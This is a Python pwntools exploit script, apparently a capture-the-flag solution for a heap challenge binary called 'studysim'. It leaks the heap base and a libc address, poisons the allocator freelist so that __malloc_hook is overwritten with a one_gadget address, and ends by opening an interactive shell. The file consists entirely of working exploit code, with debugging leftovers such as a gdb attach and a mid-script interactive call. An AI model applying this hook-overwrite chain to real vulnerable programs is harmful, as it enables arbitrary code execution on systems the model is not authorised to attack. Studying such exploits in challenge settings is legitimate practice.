from pwn import *


e = ELF("./studysim")

libc = ELF("./libc.so.6")


p = process("./studysim", env={"LD_PRELOAD":"./libc.so.6"})

#context.log_level = "debug"

gdb.attach(p, """break * main+182""")

def add(size, data="AAAA"):
	p.recvuntil(">")
	p.sendline("add")
	p.recvuntil("?")
	p.sendline(str(size))
	p.recvuntil("?")
	p.sendline(data)
	print("added")

def do(amt):
	p.recvuntil(">")
	p.sendline("do")
	p.recvuntil("?")
	p.sendline(str(amt))
	print("did")


stdout_var = 0x404020
stack_var = 0x404060
allocated_var = 0x404040

do(4)
add(8)
do(0)

p.recvline()
first_chunk = int(p.recvline().split()[5])

#print("first chunk", hex(first_chunk))

heap_base = first_chunk-0x261
print("heap base", hex(heap_base))

do(first_chunk)		# reset

# now i want to write to heap_base + 0x60

allocated_curr = int(-(-stack_var + heap_base+0x60)/8)

do(allocated_curr)

add(48, p64(stdout_var))

do(-allocated_curr+1)	# reset

p.interactive()

add(48)

add(48, "")


p.recvline()

dat = p.recvline().split("'")
print("dat", dat)

libc_leak = u64(dat[1].ljust(8, "\x00"))
libc.address = libc_leak - 0x1e5760

print("libc address", hex(libc.address))
print("malloc hook", hex(libc.sym["__malloc_hook"]))

do(2)	# reset

# write to freelist again

allocated_curr = int(-(-stack_var + heap_base+0x68)/8)
print("allocated curr", hex(allocated_curr))
do(allocated_curr)

add(69, p64(libc.sym["__malloc_hook"]))

do(-allocated_curr+1)


og = 0xe2383
og = libc.address+og

print("og", hex(og))

add(69)
add(69, p64(og))

p.sendlineafter(">", "add")
p.sendlineafter("?", "0")		# satisfies [rdx]==NULL b/c read_ulong reads a `0` into rdx

p.interactive()
